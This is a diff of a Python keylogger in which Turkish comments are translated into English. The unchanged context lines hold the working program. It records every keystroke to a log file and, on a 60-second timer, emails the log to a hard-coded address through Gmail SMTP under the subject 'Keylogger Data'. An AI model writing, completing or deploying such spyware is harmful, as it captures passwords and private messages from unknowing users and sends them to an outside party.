@@ -3,49 +3,49 @@ import smtplib
 from threading import Timer
 from email.mime.text import MIMEText
 
-# Kayıt dosyası adı
+# Record file name
 LOG_FILE = "log.txt"
 
-# E-posta bilgileri
+# Email information
 EMAIL_ADDRESS = "your_email_address@gmail.com"
 EMAIL_PASSWORD = "your_email_password"
 SEND_TO_EMAIL = "send_to_email_address@gmail.com"
 EMAIL_INTERVAL = 60  # Saniye cinsinden
 
-# Klavye tuşlarını kaydetme fonksiyonu
+# Function to save keyboard keys
 def keylogger(e):
     # Kayıt dosyasını açma
     with open(LOG_FILE, "a") as f:
-        # Klavyeden basılan tuşu alıp dosyaya yazma
+        # Take the key pressed from the keyboard and write it to the file
         key = e.name
         f.write(key + "\n")
 
-# E-posta gönderme fonksiyonu
+# Email sending function
 def send_email():
-    # Kayıt dosyasını okuma
+    # Reading the record file
     with open(LOG_FILE, "r") as f:
         data = f.read()
 
-    # E-posta içeriğini oluşturma
+    # Create email content
     msg = MIMEText(data)
     msg["Subject"] = "Keylogger Data"
     msg["From"] = EMAIL_ADDRESS
     msg["To"] = SEND_TO_EMAIL
 
-    # E-posta sunucusuna bağlanma ve e-postayı gönderme
+    # Connect to the email server and send the email
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
     server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
     server.quit()
 
-# Zamanlayıcı fonksiyonu
+# Timer function
 def timer():
     # Belirli aralıklarla e-posta gönderme
     Timer(EMAIL_INTERVAL, timer).start()
     send_email()
 
-# Programı başlatma
+# Starting the program
 timer()
 keyboard.on_release(keylogger)
 keyboard.wait()
